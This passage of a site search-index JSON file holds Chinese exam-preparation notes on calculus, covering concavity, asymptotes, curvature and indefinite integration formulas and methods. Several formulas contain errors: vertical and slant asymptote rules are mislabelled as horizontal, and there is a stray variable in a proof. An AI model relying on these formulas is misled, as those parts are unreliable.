\u51fd\u6570\u7684\u6781\u503c"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#33","text":"","title":"3.3. \u51fd\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#34","text":"\u5b9a\u4e49 \u8bbe\u51fd\u6570 f(x) \u5728\u533a\u95f4 I \u4e0a\u8fde\u7eed\uff0c\u5982\u679c\u5bf9 I \u4e0a\u4efb\u610f\u4e24\u70b9 x_1, x_2 \uff0c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) < \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u5728 I \u4e0a\u7684\u56fe\u5f62\u662f\u51f9\u7684\u3002\u5982\u679c\u6052\u6709 f(\\frac{x_1 + x_2}{2}) > \\frac{f(x_1) + f(x_2)}{2} \u5219\u79f0 f(x) \u5728 I \u4e0a\u7684\u56fe\u5f62\u662f\u51f8\u7684\u3002","title":"3.4. \u66f2\u7ebf\u7684\u51f9\u51f8\u6027"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#35","text":"","title":"3.5. \u66f2\u7ebf\u7684\u6e10\u8fd1\u7ebf"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#351","text":"\u6e10\u8fd1\u7ebf \u82e5\u70b9 M \u6cbf\u66f2\u7ebf y = f(x) \u65e0\u9650\u8fdc\u79bb\u539f\u70b9\u65f6\uff0c\u5b83\u4e0e\u67d0\u6761\u76f4\u7ebf L \u4e4b\u95f4\u7684\u8ddd\u79bb\u5c06\u8d8b\u8fd1\u4e8e\u96f6\uff0c\u5219\u79f0\u76f4\u7ebf L \u4e3a\u66f2\u7ebf y = f(x) \u7684\u4e00\u6761 \u6e10\u8fd1\u7ebf \u3002 \u6c34\u5e73\u6e10\u8fd1\u7ebf \u82e5\u76f4\u7ebf L \u4e8e x \u8f74\u5e73\u884c\uff0c\u5219\u79f0 L \u4e3a\u66f2\u7ebf y= f(x) \u7684 \u6c34\u5e73\u6e10\u8fd1\u7ebf \uff1b \u5782\u76f4\u6e10\u8fd1\u7ebf \u82e5\u76f4\u7ebf L \u4e8e x \u8f74\u5782\u76f4\uff0c\u5219\u79f0 L \u4e3a\u66f2\u7ebf y = f(x) \u7684 \u5782\u76f4\u6e10\u8fd1\u7ebf \uff1b \u659c\u6e10\u8fd1\u7ebf \u82e5\u66f2\u7ebf\u5373\u4e0d\u5e73\u884c\u4e8e x \u8f74\uff0c\u4e5f\u4e0d\u5782\u76f4\u4e8e y \u8f74\uff0c\u5219\u79f0\u76f4\u7ebf L \u4e3a\u66f2\u7ebf y = f(x) \u7684 \u659c\u6e10\u8fd1\u7ebf \u3002","title":"3.5.1. \u6e10\u8fd1\u7ebf\u7684\u5b9a\u4e49"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#352","text":"\u6c34\u5e73\u6e10\u8fd1\u7ebf \u82e5 \\lim\\limits_{x \\to \\infty} f(x) = A \uff0c\u90a3\u4e48 y = A \u662f\u66f2\u7ebf y = f(x) \u7684\u6c34\u5e73\u6e10\u8fd1\u7ebf \u6216 \\lim\\limits_{x \\to -\\infty} f(x) = A . \u6216 \\lim\\limits_{x \\to +\\infty} f(x) = A . \u6700\u591a\u4e24\u6761 \u5782\u76f4\u6e10\u8fd1\u7ebf \u82e5 \\lim\\limits_{x \\to x_0s} f(x) = \\infty \uff0c\u90a3\u4e48 x = x_0 \u662f\u66f2\u7ebf y = f(x) \u7684\u6c34\u5e73\u6e10\u8fd1\u7ebf \u6216 \\lim\\limits_{x \\to - x_0} f(x) = A . \u6216 \\lim\\limits_{x \\to + x_0} f(x) = A . \u6700\u591a\u65e0\u7a77\u6761 \u659c\u6e10\u8fd1\u7ebf \u82e5 \\lim\\limits_{x \\to x_0s} \\dfrac{f(x)}{x} = a \uff0c\u4e14 \\lim\\limits_{x \\to \\infty }(f(x) - ax) = b \uff0c\u90a3\u4e48 x = x_0 \u662f\u66f2\u7ebf y = f(x) \u7684\u6c34\u5e73\u6e10\u8fd1\u7ebf \u6216 \\lim\\limits_{x \\to - \\infty }(f(x) - ax) = b . \u6216 \\lim\\limits_{x \\to + \\infty }(f(x) - ax) = b . \u6700\u591a\u4e24\u6761\uff0c\u67d0\u65b9\u5411\u82e5\u6709\u6c34\u5e73\u6e10\u8fd1\u7ebf\uff0c\u5219\u65e0\u659c\u6e10\u8fd1\u7ebf\uff0c\u82e5\u6709\u659c\u6e10\u8fd1\u7ebf\uff0c\u5219\u65e0\u6c34\u5e73\u6e10\u8fd1\u7ebf\u3002 \u82e5\u4e00\u4e2a\u66f2\u7ebf\u65b9\u7a0b\u53ef\u4ee5\u5199\u4e3a y = ax + b + \\alpha(x) \uff0c\u5176\u4e2d \\alpha(x) \u5728 x \\to \\infty \u65f6\u4e3a\u65e0\u7a77\u5c0f\uff0c\u5219\u6709\u659c\u6e10\u8fd1\u7ebf y = ax + b .","title":"3.5.2. \u6e10\u8fd1\u7ebf\u7684\u6c42\u89e3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#36","text":"\u5229\u7528\u51fd\u6570\u7684\u5355\u8c03\u6027\u3001\u6781\u503c\u3001\u66f2\u7ebf\u7684\u51f9\u51f8\u6027\u3001\u62d0\u70b9\u53ca\u6e10\u8fd1\u7ebf\u53ef\u4ee5\u4f5c\u51fa\u51fd\u6570\u66f2\u7ebf\u3002 \u6b65\u9aa4 \u6c42\u5b9a\u4e49\u57df\uff0c\u5224\u65ad\u662f\u5426\u6709\u65e0\u5b9a\u4e49\u70b9 \u6c42 y' \uff0c\u5224\u65ad\u5355\u8c03\u6027\u548c\u6781\u503c \u6c42 y'' \uff0c\u5224\u65ad\u66f2\u7ebf\u7684\u51f9\u51f8\u6027 \u6c42\u6781\u9650\uff0c\u5224\u65ad\u6e10\u8fd1\u7ebf \u4f5c\u56fe","title":"3.6. \u51fd\u6570\u7684\u4f5c\u56fe"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#37","text":"\u5f27\u5fae\u5206 \u5b9a\u4e49\uff1a\u8bbe y = f(x) \u5728 (a, b) \u5185\u6709\u8fde\u7eed\u5bfc\u6570\uff0c\u5219\u6709 \u5f27\u5fae\u5206 ds = \\sqrt{1 + (y')^2}dx \\tag{3.15} \u66f2\u7387 \u5b9a\u4e49\uff1a\u8bbe y = f(x) \u6709\u4e8c\u9636\u5bfc\u6570\uff0c\u5219\u6709\u66f2\u7387 K = \\frac{|y''|}{(1 + (y')^2)^{3/2}} \\tag{3.16} \u66f2\u7387\u534a\u5f84 \u5b9a\u4e49\uff1a\u79f0 \\rho = \\dfrac{1}{K} \u4e3a \u66f2\u7387\u534a\u5f84 \u66f2\u7387\u5706 \u5b9a\u4e49\uff1a\u82e5\u66f2\u7ebf y = f(x) \u5728\u70b9 M(x, y) \u5904\u7684\u66f2\u7387\u4e3a K(K \\ne 0) \uff0c\u5728\u8fd9\u70b9 M \u5904\u66f2\u7ebf\u7684\u6cd5\u7ebf\u4e0a\uff0c\u5728\u66f2\u7ebf\u51f9\u7684\u4e00\u4fa7\u53d6\u4e00\u70b9 D \uff0c\u4f7f |DM| = \\dfrac{1}{K} = \\rho \uff0c\u4ee5 D \u4e3a\u5706\u5fc3\uff0c \\rho \u4e3a\u534a\u5f84\u7684\u5706\u6210\u4e3a\u66f2\u7ebf\u5728\u70b9 M \u7684\u66f2\u7387\u5706\u3002 \u66f2\u7387\u4e2d\u5fc3 \u5b9a\u4e49\uff1a\u66f2\u7387\u5706\u7684\u5706\u5fc3 D \uff0c\u79f0\u4e3a\u66f2\u7ebf\u5728\u70b9 M \u5904\u7684\u66f2\u7387\u4e2d\u5fc3\u3002","title":"3.7. \u66f2\u7ebf\u7684\u5f27\u5fae\u5206\u4e0e\u66f2\u7387"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/3.%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86%E5%8F%8A%E5%AF%BC%E6%95%B0%E5%BA%94%E7%94%A8/#4","text":"\u5fae\u5206\u4e2d\u503c\u5b9a\u7406 \u7f57\u5c14\u5b9a\u7406 \u62c9\u683c\u6717\u65e5\u4e2d\u503c\u5b9a\u7406 \u67ef\u897f\u4e2d\u503c\u5b9a\u7406 \u6cf0\u52d2\u516c\u5f0f \u5bfc\u6570\u5e94\u7528 \u51fd\u6570\u7684\u5355\u8c03\u6027 \u51fd\u6570\u7684\u6781\u503c\u3001\u6700\u503c \u66f2\u7ebf\u7684\u51f9\u51f8\u6027\u548c\u6e10\u8fd1\u7ebf \u5f27\u5fae\u5206\u4e0e\u66f2\u7387","title":"4. \u603b\u7ed3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/","text":"\u7b2c\u56db\u7ae0 \u4e0d\u5b9a\u79ef\u5206 # \u76ee\u5f55 # \u7b2c\u56db\u7ae0 \u4e0d\u5b9a\u79ef\u5206 \u76ee\u5f55 1. \u80cc\u666f 1. \u4e0d\u5b9a\u79ef\u5206\u7684\u6982\u5ff5\u4e0e\u6027\u8d28 1.1. \u4e0d\u5b9a\u79ef\u5206 1.2. \u539f\u51fd\u6570\u5b58\u5728\u5b9a\u7406 1.3. \u4e0d\u5b9a\u79ef\u5206\u7684\u6027\u8d28 2. \u4e0d\u5b9a\u79ef\u5206\u57fa\u672c\u516c\u5f0f 3. \u4e09\u79cd\u4e3b\u8981\u79ef\u5206\u6cd5 3.1. \u7b2c\u4e00\u6362\u5143\u79ef\u5206\u6cd5 3.2. \u7b2c\u4e8c\u6362\u5143\u79ef\u5206\u6cd5 3.3. \u5206\u90e8\u79ef\u5206\u6cd5 4. \u4e09\u7c7b\u5e38\u89c1\u53ef\u79ef\u51fd\u6570\u79ef\u5206 4.1. \u6709\u7406\u51fd\u6570 4.2. \u4e09\u89d2\u6709\u7406\u5f0f\u79ef\u5206 4.3. \u7b80\u5355\u65e0\u7406\u51fd\u6570\u79ef\u5206 5. \u603b\u7ed3 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u56db\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002 1. \u4e0d\u5b9a\u79ef\u5206\u7684\u6982\u5ff5\u4e0e\u6027\u8d28 # 1.1. \u4e0d\u5b9a\u79ef\u5206 # \u5b9a\u4e49 f(x) \u7684\u539f\u51fd\u6570\u7684\u5168\u4f53\u6210\u4e3a f(x) \u7684\u4e0d\u5b9a\u79ef\u5206\uff0c\u8bb0\u4e3a \\int f(x)dx . \u5982\u679c F(x) \u4e3a f(x) \u7684\u4e00\u4e2a\u539f\u51fd\u6570\uff0c\u5219\u6709 \\int {f(x)}dx = F(x) + C \\tag{4.1} \u5176\u4e2d C \u4e3a\u4efb\u610f\u5e38\u6570 1.2. \u539f\u51fd\u6570\u5b58\u5728\u5b9a\u7406 # \u8bc1\u660e\u5b58\u5728\u7684\u5b9a\u7406 \u82e5 f(x) \u5728\u533a\u95f4 I \u4e0a\u8fde\u7eed\uff0c\u5219 f(x) \u5728\u533a\u95f4 I \u4e0a\u4e00\u5b9a\u5b58\u5728\u539f\u51fd\u6570 \u8bc1\u660e\u4e0d\u5b58\u5728\u7684\u5b9a\u7406 \u82e5 f(x) \u5728\u533a\u95f4 I \u4e0a\u6709\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9\uff0c\u5219 f(x) \u5728\u533a\u95f4 I \u4e0a\u6ca1\u6709\u539f\u51fd\u6570 1.3. \u4e0d\u5b9a\u79ef\u5206\u7684\u6027\u8d28 # (\\int {f(x)}dx)' = f(x), d (\\int {f(x)}dx) = f(x)dx \\tag{4.2} \\int {f'(x)}dx = f(x) + C, \\int d{f(x)}dx = f(x) + C \\tag{4.3} \\int {f(x) \\pm g(x)}dx = \\int {f(x)}dx \\pm \\int {g(x)}dx \\tag{4.4} \\int k{f(x)}dx = k \\int {f(x)}dx, (k = C) \\tag{4.5} 2. \u4e0d\u5b9a\u79ef\u5206\u57fa\u672c\u516c\u5f0f # \\int {0}dx = C \\tag{4.6} \\int {x^a}dx = \\frac{1}{a+1}x^{\\alpha + 1} + C, (\\alpha \\ne -1) \\tag{4.7} \\int \\frac{1}{x} dx = \\ln|x| + C \\tag{4.8} \\int a^x dx = \\frac{a^x}{\\ln a} + C, (a > 0, a \\ne 1) \\tag{4.9} \\int e^x dx = e^x + C \\tag{4.10} \\int \\sin x dx = - \\cos(x) + C \\tag{4.11} \\int \\cos(x) dx = \\sin(x) + C \\tag{4.12} \\int \\sec^2 x dx = \\tan(x) + C \\tag{4.13} \\int \\csc^2 x dx = -\\ctg x + C \\tag{4.14} \\int \\sec x \\tan x dx = \\sec x + C \\tag{4.15} \\int \\csc x \\ctg x dx = - \\csc x + C \\tag{4.16} \\int \\frac{1}{\\sqrt{1 - x^2}}dx = \\arcsin x + C \\tag{4.17} \u8bc1\u660e4.17\uff1a \u51d1\u5fae\u5206\u6cd5 { \\begin{aligned} \\int \\frac{1}{\\sqrt{1 - x^2}}dx &= \\int \\dfrac{dx}{a \\sqrt{1 - (\\dfrac{x}{a}})^2} dx \\\\ &= \\int \\frac{d (\\dfrac{x}{a})}{\\sqrt{1 - (\\dfrac{x}{a}})^2} dx \\\\ &= \\arcsin x + C \\end{aligned} } \\int \\frac{1}{{1 + x^2}}dx = \\arctan x + C \\tag{4.18} \\int \\frac{1}{{a^2 + x^2}}dx = \\frac{1}{a} \\arctan \\frac{x}{a} + C \\tag{4.19} \\int \\frac{1}{x^2 - a^2} dx = \\frac{1}{2a} \\ln|\\frac{x-a}{x+a}| + C \\tag{4.20} \\int \\frac{1}{\\sqrt{x^2 + a^2}} dx = \\ln (x + \\sqrt{x^2 + a^2}) + C \\tag{4.21} \u8bc1\u660e4.21\uff1a \u7b2c\u4e8c\u7c7b\u6362\u5143\u6cd5\uff0c\u4ee4 x = a\\tan t { \\begin{aligned} \\int \\frac{1}{\\sqrt{x^2 + a^2}} dx &= \\int \\frac{a\\sec^2 t}{a \\sec t} dt = \\int \\sec t dt \\\\ &= \\ln |\\sec t + \\tan t| + C \\\\ &= \\ln |x + \\sqrt{x^2 + a^2}| - \\ln a+ C\\\\ &= \\ln |x + \\sqrt{x^2 + a^2}| + C \\end{aligned} } \\int \\frac{1}{\\sqrt{x^2 - a^2}} dx = \\ln |x + \\sqrt{x^2 - a^2}| + C \\tag{4.22} \u8bc1\u660e4.22\uff1a \u7b2c\u4e8c\u7c7b\u6362\u5143\u6cd5\uff0c\u4ee4 x = a\\sec t { \\begin{aligned} \\int \\frac{1}{\\sqrt{x^2 - a^2}} dx &= \\int \\frac{a\\sec t \\tan t}{a \\tan t} dt = \\int \\sec t dt \\\\ &= \\ln |\\sec t + \\tan t| + C \\\\ &= \\ln |x + \\sqrt{x^2 - a^2}| - \\ln a+ C\\\\ &= \\ln |x + \\sqrt{x^2 - a^2}| + C \\end{aligned} } \\int {\\sec x} dx = \\ln |\\sec x + \\tan x| + C \\tag{4.23} \u8bc1\u660e4.23\uff1a \u51d1\u5fae\u5206\u6cd5 { \\begin{aligned} \\int {\\sec x} dx &= \\int \\frac{\\sec x[\\sec x + \\tan x]}{\\sec x + \\tan x} dx &=& \\int \\frac{\\sec^2 x + \\sec x \\tan x}{\\sec x + \\tan x} dx \\\\ &= \\int \\frac{d(\\sec x + \\tan x)}{\\sec x + \\tan x}\\\\ &= \\ln |\\sec x + \\tan x| + C \\end{aligned} } \\int {\\csc x} dx = -\\ln |\\csc x + \\ctg x| + C \\tag{4.24} \u8bc1\u660e4.24\uff1a \u51d1\u5fae\u5206\u6cd5 { \\begin{aligned} \\int {\\csc x} dx &= \\int \\frac{\\csc x[\\csc x + \\ctg x]}{\\csc x + \\ctg x} dx &=& \\int \\frac{\\csc^2 x + \\csc x \\ctg x}{\\csc x + \\ctg x} dx \\\\ &= \\int \\frac{d(\\csc x + \\ctg x)}{\\csc x + \\ctg x}\\\\ &= \\ln |\\csc x + \\ctg x| + C \\end{aligned} } 3. \u4e09\u79cd\u4e3b\u8981\u79ef\u5206\u6cd5 # 3.1. \u7b2c\u4e00\u6362\u5143\u79ef\u5206\u6cd5 # \u5b9a\u7406 \u8bbe \\int f(u) du = F(u) + C , u = \\varphi(x) \u5b58\u5728\u8fde\u7eed\u5bfc\u6570\uff0c\u5219 \\int f[\\varphi(x)]\\varphi '(x) dx = \\int f[\\varphi(x)] d\\varphi x = F(\\varphi(x)) + C \\tag{4.25} 3.2. \u7b2c\u4e8c\u6362\u5143\u79ef\u5206\u6cd5 # \u5b9a\u7406 \u8bbe x = \\varphi (x) \u662f\u5355\u8c03\u7684\u3001\u53ef\u5bfc\u7684\u51fd\u6570\uff0c\u5e76\u4e14 \\varphi'(t) \\ne 0 \uff0c\u53c8 \\int f[\\varphi(t)]\\varphi '(t) dt = F(\\varphi(t)) + C \u5219 \\int {f(x)} dx = \\int f[\\varphi(t)]\\varphi '(t) dt = F(\\varphi(t)) + C = F[\\varphi^{-1}(x)] + C \\tag{4.26} \u6ce8 \uff1a\u5f0f\u4e2d\u5bf9 \\varphi (t) \u6c42\u5bfc\u7684\u90e8\u5206\u5bb9\u6613\u88ab\u9057\u6f0f \u5e38\u7528\u7684\u4e09\u79cd\u53d8\u91cf\u4ee3\u6362 \u88ab\u79ef\u51fd\u6570\u542b\u6709 \\sqrt{a^2 - x^2} \uff0c\u4ee4 x = a\\sin x \uff08\u6216 a \\cos x ). \u88ab\u79ef\u51fd\u6570\u542b\u6709 \\sqrt{x^2 + a^2} \uff0c\u4ee4 x = a\\tan x . \u88ab\u79ef\u51fd\u6570\u542b\u6709 \\sqrt{x^2 - a^2} \uff0c\u4ee4 x = a\\sec x . 3.3. \u5206\u90e8\u79ef\u5206\u6cd5 # \u5206\u90e8\u79ef\u5206\u516c\u5f0f \\int u dv = uv - \\int v du \\tag{4.27} \u5206\u90e8\u79ef\u5206\u6cd5\u4e2d u,v \u7684\u9009\u53d6 \u628a\u591a\u9879\u5f0f\u4ee5\u5916\u7684\u51fd\u6570\u51d1\u8fdb\u5fae\u5206\u53f7\uff0c\u56e0\u4e3a\u5bf9\u591a\u9879\u5f0f\u6c42\u5bfc\u82e5\u5e72\u6b21\u540e\u80fd\u591f\u5c06\u5176\u5316\u4e3a\u5e38\u6570\u9879 \\int p_n(x)e^{\\alpha x} dx, \\int p_n(x)\\sin \\alpha x dx, \\int p_n(x)\\cos \\alpha x dx \u628a\u6307\u6570\u51fd\u6570\u6216\u4e09\u89d2\u51fd\u6570\u51d1\u8fdb\u5fae\u5206\u53f7\u90fd\u53ef\u4ee5\uff0c\u4f46\u628a\u6307\u6570\u51d1\u8fdb\u53bb\u66f4\u7b80\u5355 \\int e^{\\alpha x}\\sin \\beta x dx, \\int e^{\\alpha x}\\cos \\beta x \u628a\u591a\u9879\u5f0f\u51d1\u8fdb\u5fae\u5206\u53f7\uff0c\u591a\u9879\u5f0f\u4ee5\u5916\u7684\u51fd\u6570\u65b9\u4fbf\u6c42\u5bfc\uff0c\u4e0d\u65b9\u4fbf\u79ef\u5206 \\int p_n(x)\\ln x dx, \\int p_n(x)\\arctan x dx, \\int p_n(x)\\arcsin x dx 4. \u4e09\u7c7b\u5e38\u89c1\u53ef\u79ef\u51fd\u6570\u79ef\u5206 # 4.1. \u6709\u7406\u51fd\u6570 # \u6709\u7406\u51fd\u6570\u79ef\u5206 \\int R(x) dx \u4e00\u822c\u65b9\u6cd5\uff08\u90e8\u5206\u5206\u5f0f\u6cd5\uff09 \u7279\u6b8a\u65b9\u6cd5\uff08\u52a0\u9879\u51cf\u9879\u62c6\u6216\u51d1\u5fae\u5206\u964d\u5e42\uff09 4.2. \u4e09\u89d2\u6709\u7406\u5f0f\u79ef\u5206 # \u4e09\u89d2\u6709\u7406\u5f0f\u79ef\u5206 \\int R(\\sin x, \\cos x) dx \u4e00\u822c\u65b9\u6cd5\uff08\u4e07\u80fd\u4ee3\u6362\uff09\u4ee4 \\tan \\dfrac{x}{2} = t . \\int R(\\sin x, \\cos x) dx = \\int R(\\frac{2t}{1 + t^2}, \\frac{1 - t^2}{1 + t^2}) dt \\tag{4.28} \u7279\u6b8a\u65b9\u6cd5\uff08\u4e09\u89d2\u53d8\u5f62\uff0c\u6362\u5143\uff0c\u5206\u89e3\uff09 \u51e0\u79cd\u5e38\u7528\u7684\u6362\u5143\u6cd5 \u82e5 R(- \\sin x, \\cos x) = - R(\\sin x, \\cos x) \uff0c\u5219\u4ee4 u = \\cos x \uff0c\u6216\u51d1 d\\cos x . \u82e5 R(\\sin x, - \\cos x) = - R(\\sin x, \\cos x) \uff0c\u5219\u4ee4 u = \\sin x \uff0c\u6216\u51d1 d\\sin x . \u82e5 R(- \\sin x, - \\cos x) = R(\\sin x, \\cos x) \uff0c\u5219\u4ee4 u = \\tan x \uff0c\u6216\u51d1 d\\tan x . 4.3. \u7b80\u5355\u65e0\u7406\u51fd\u6570\u79ef\u5206 # \u7b80\u5355\u65e0\u7406\u51fd\u6570\u79ef\u5206 \\int R(x, \\sqrt[n]{\\dfrac{ax + b}{cx + d}}) dx \u4ee4 \\sqrt[n]{\\dfrac{ax + b}{cx + d}} = t \uff0c\u5c06\u5176\u8f6c\u5316\u4e3a\u6709\u7406\u51fd\u6570\u79ef\u5206\u8fdb\u884c\u8ba1\u7b97 5. \u603b\u7ed3 # \u4e24\u4e2a\u6982\u5ff5 \u539f\u51fd\u6570 \u4e0d\u5b9a\u79ef\u5206 \u4e09\u79cd\u65b9\u6cd5 \u7b2c\u4e00\u7c7b\u6362\u5143\u6cd5 \u7b2c\u4e8c\u7c7b\u6362\u5143\u6cd5 \u5206\u90e8\u79ef\u5206\u6cd5 \u4e09\u79cd\u5f62\u5f0f \u6709\u7406\u51fd\u6570 \u4e09\u89d2\u6709\u7406\u5f0f \u7b80\u5355\u65e0\u7406\u51fd\u6570","title":"4.\u7b2c\u56db\u7ae0 \u4e0d\u5b9a\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#_1","text":"","title":"\u7b2c\u56db\u7ae0 \u4e0d\u5b9a\u79ef\u5206"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#_2","text":"\u7b2c\u56db\u7ae0 \u4e0d\u5b9a\u79ef\u5206 \u76ee\u5f55 1. \u80cc\u666f 1. \u4e0d\u5b9a\u79ef\u5206\u7684\u6982\u5ff5\u4e0e\u6027\u8d28 1.1. \u4e0d\u5b9a\u79ef\u5206 1.2. \u539f\u51fd\u6570\u5b58\u5728\u5b9a\u7406 1.3. \u4e0d\u5b9a\u79ef\u5206\u7684\u6027\u8d28 2. \u4e0d\u5b9a\u79ef\u5206\u57fa\u672c\u516c\u5f0f 3. \u4e09\u79cd\u4e3b\u8981\u79ef\u5206\u6cd5 3.1. \u7b2c\u4e00\u6362\u5143\u79ef\u5206\u6cd5 3.2. \u7b2c\u4e8c\u6362\u5143\u79ef\u5206\u6cd5 3.3. \u5206\u90e8\u79ef\u5206\u6cd5 4. \u4e09\u7c7b\u5e38\u89c1\u53ef\u79ef\u51fd\u6570\u79ef\u5206 4.1. \u6709\u7406\u51fd\u6570 4.2. \u4e09\u89d2\u6709\u7406\u5f0f\u79ef\u5206 4.3. \u7b80\u5355\u65e0\u7406\u51fd\u6570\u79ef\u5206 5. \u603b\u7ed3","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#1","text":"\u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u56db\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#1_1","text":"","title":"1. \u4e0d\u5b9a\u79ef\u5206\u7684\u6982\u5ff5\u4e0e\u6027\u8d28"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/4.%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E4%B8%8D%E5%AE%9A%E7%A7%AF%E5%88%86/#11","text":"\u5b9a\u4e49 f(x) \u7684\u539f\u51fd\u6570\u7684\u5168\u4f53\u6210\u4e3a f(x) \u7684\u4e0d\u5b9a\u79ef\u5206\uff0c\u8bb0\u4e3a \\int f(x)dx . \u5982\u679c F(x) \u4e3a f(x) \u7684\u4e00\u4e2a\u539f\u51fd\u6570\uff0c\u5219\u6709 \\int {f(x)}dx = F(x) + C \\tag{4.1} \u5176\u4e2d C \u4e3a\u4efb\u610f\u5e38\u6570","title":"1.1. 